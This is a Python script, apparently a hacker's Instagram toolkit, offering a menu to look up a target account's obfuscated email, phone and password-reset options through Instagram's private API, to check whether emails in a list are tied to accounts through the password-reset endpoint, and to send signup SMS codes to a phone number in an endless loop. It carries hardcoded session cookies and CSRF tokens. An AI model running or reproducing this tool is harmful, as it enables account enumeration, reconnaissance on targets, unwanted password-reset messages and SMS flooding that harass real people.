try:
	import requests
	from instabot import Bot,api
	from user_agent import generate_user_agent
except:exit('[!] Download The lib Please\n> instabot,bot,requests_toolbelt,user_agent,requests')
def info_Getting():
	print("-------------------------------------")
	user=input("[?] username:")
	headers={"Connection": "close", "X-IG-Connection-Type": "WIFI","mid":"XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq","X-IG-Capabilities": "3R4=","Accept-Language": "ar-sa","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	"User-Agent": "Instagram 99.4.0 Filza_TweakPY (Filza_TweakPY)",
	"Accept-Encoding": "gzip, deflate"}
	data={"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }
	req=requests.post("https://i.instagram.com:443/api/v1/users/lookup/",headers=headers,data=data)
	inf=req.json()
	print("-------------------------------------")
	print("[+] username:",user)
	print("-------------------------------------")
	print("[+] email sent:",inf['email_sent'])
	print("[+] sms sent:",inf['sms_sent'])
	print("[+] You search by:",inf['lookup_source'])
	try:print("[+] email:",inf['obfuscated_email'])
	except:pass
	try:print("[+] phone:",inf['obfuscated_phone'])
	except:pass
	print("[+] acc is private or not:",inf['user']['is_private'])
	print("[+] acc is verified or not:",inf['user']['is_verified'])
	print("[+] valid phone:",inf['has_valid_phone'])
	print("[+] can reset with email:",inf['can_email_reset'])
	print("[+] can reset with sms:",inf['can_sms_reset'])
	print("[+] any user like his name:",inf['multiple_users_found'])
	print("[+] full name:",inf['user']['full_name'])
	print("[+] can reset with wa:",inf['can_wa_reset'])
	print("[+] user id:",inf['user_id'])
	print("[+] the fb login option:",inf['fb_login_option'])
	print("-------------------------------------")
	print("[+] profile pic id :",inf['user']['profile_pic_id'])
	print("[+] profile pic url:",inf['user']['profile_pic_url'])
	print("-------------------------------------")
def check_vaild_email():
	email_or_user=input("[?] Type The email:\n>")
	head={
			'Host': 'www.instagram.com',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
			'Accept': '*/*',
			'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
			'Accept-Encoding': 'gzip, deflate, br',
			'X-CSRFToken': '5o7PN96Y9Ln95EnlXN6t0pmCHDqdbect',
			'X-Instagram-AJAX': '11170428d971',
			'X-IG-App-ID': '936619743392459',
			'X-ASBD-ID': '437806',
			'X-IG-WWW-Claim': '0',
			'Content-Type': 'application/x-www-form-urlencoded',
			'X-Requested-With': 'XMLHttpRequest',
			'Content-Length': '103',
			'Origin': 'https://www.instagram.com',
			'Connection': 'keep-alive',
			'Referer': 'https://www.instagram.com/accounts/password/reset/',
			'Cookie': 'ig_did=7B796F1F-ADE7-429C-8ADB-9B131663E5E4; datr=2kDRYNWmjctteBSnOqogPrxv; csrftoken=5o7PN96Y9Ln95EnlXN6t0pmCHDqdbect; mid=YNIa4QALAAGoeESFP8axY9NfC9t3; ig_nrcb=1',
			'TE': 'Trailers'}
	data={"email_or_username":email_or_user,"recaptcha_challenge_field":"","flow":"","app_id":"","source_account_id":""}
	req=requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/',headers=head,data=data)
	if 'No users found' in req.text:print("[-] NOT Linked to an acc on instagram")
	elif req.json()['status']=="ok":
		print(f"[+] Linked To an account on instagram")
		print(f"[+] Done send Link to [{req.json()['contact_point']}]")
		print("[?] Can recover with code :"+str(req.json()['can_recover_with_code']))
	else:print("Error Ban [min 5/10] ")
def Check_vaild_list():
	Email='email.txt'
	File=open(Email, 'r')
	while True:
		email_or_user=File.readline().split('\n')[0]
		head={
			'Host': 'www.instagram.com',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
			'Accept': '*/*',
			'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
			'Accept-Encoding': 'gzip, deflate, br',
			'X-CSRFToken': '5o7PN96Y9Ln95EnlXN6t0pmCHDqdbect',
			'X-Instagram-AJAX': '11170428d971',
			'X-IG-App-ID': '936619743392459',
			'X-ASBD-ID': '437806',
			'X-IG-WWW-Claim': '0',
			'Content-Type': 'application/x-www-form-urlencoded',
			'X-Requested-With': 'XMLHttpRequest',
			'Content-Length': '103',
			'Origin': 'https://www.instagram.com',
			'Connection': 'keep-alive',
			'Referer': 'https://www.instagram.com/accounts/password/reset/',
			'Cookie': 'ig_did=7B796F1F-ADE7-429C-8ADB-9B131663E5E4; datr=2kDRYNWmjctteBSnOqogPrxv; csrftoken=5o7PN96Y9Ln95EnlXN6t0pmCHDqdbect; mid=YNIa4QALAAGoeESFP8axY9NfC9t3; ig_nrcb=1',
			'TE': 'Trailers'}			
		data={
			"email_or_username":email_or_user,
			"recaptcha_challenge_field":"","flow":"",
			"app_id":"",
			"source_account_id":""}
		req=requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/',headers=head,data=data)
		if str(email_or_user)==""or'':
			break
		elif 'No users found' in req.text:
			print("------------------------------------")
			print("[-] NOT Linked:",str(email_or_user))
			print("------------------------------------")
		elif req.json()['status']=="ok":
			print("------------------------------------")
			print(f"[+] Linked:",str(email_or_user))
			print("[?] recover with code :"+str(req.json()['can_recover_with_code']))
			print("------------------------------------")
		else:
			print("Error Ban [min 5/10] ")
def sms_In():
	phone=input('[+] The phone Number : ')
	url='https://www.instagram.com/accounts/send_signup_sms_code_ajax/'
	head={
		'HOST': "www.instagram.com",
		'KeepAlive': 'True',
		'user-agent': generate_user_agent(),
		'Cookie': 'd9d491e11bf90765d9d491e11bf90765',
		'Accept': "*/*",
		'ContentType': "application/x-www-form-urlencoded",
		"X-Requested-With": "XMLHttpRequest",
		"X-IG-App-ID": "936619743392459",
		"X-Instagram-AJAX": "missing",
		"X-CSRFToken": "missing",
		"Accept-Language": "en-US,en;q=0.9"}   
	data={
		'client_id': "X5uC6wALAAF-Lw3oSZE9kuY0mP_9",
		'phone_number': phone,
		'phone_id': '',
		'big_blue_token': ''}
	while True:
		Sms_in = requests.post(url,headers=head, data=data)
		if 'Looks like your phone number may be incorrect.' in Sms_in.text:
			print('[!] Check Your Phone Number')
			exit()
		elif 'Please wait a few minutes before you try again.' in Sms_in.text:
			print('[!] Ban For Min [3/10]')			
			exit()
		elif 'true' in Sms_in.text:print( '[-] Done send sms')						
		else:
			print('[!] Error ..')
			exit()
print('''   
██╗ ██████╗       ███╗   ██╗███████╗
██║██╔════╝       ████╗  ██║██╔════╝
██║██║  ███╗█████╗██╔██╗ ██║█████╗  
██║██║   ██║╚════╝██║╚██╗██║██╔══╝  
██║╚██████╔╝      ██║ ╚████║██║     
╚═╝ ╚═════╝       ╚═╝  ╚═══╝╚═╝                                                                  
   [<\>] @TweakPY - @vv1ck''')
print("--------------------------------------")
ch=int(input("1) Check Email Linked [List]\n2) Check Email Linked [ONE]\n3) SMS Send Message's \n4) Get info About Account by user\n5) Get Account ID\n6) Get Post ID\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"))
print("--------------------------------------")
if ch==1:Check_vaild_list()
elif ch==2:check_vaild_email()
elif ch==3:sms_In()
elif ch==4:info_Getting()
elif ch==5:
	bot=Bot()	
	print('[+] Note: Your Account Info Saved in File: "config" And You must Delete or Rename This File in order to use This Later')	
	user=input("[<] username :")
	pess=input("[>] Password :")    
	bot.login(username=user,password=pess)
	use=input('[?] Target :')
	ID=bot.get_user_id_from_username(username=use)
	print(f'[+] ID IS : {ID}')
elif ch==6:
	bot=Bot()	
	print('[+] Note: Your Account Info Saved in File: "config" And You must Delete or Rename This File in order to use This Later')	
	user=input("[<] username :")
	pess=input("[>] Password :")    
	bot.login(username=user,password=pess)
	url=input(f'[>] Post Url :\n')
	get_id=bot.get_media_id_from_link(link=url)
	print(f'[+] THE POST ID IS : {get_id}')
else:exit('[!] Alright ..')
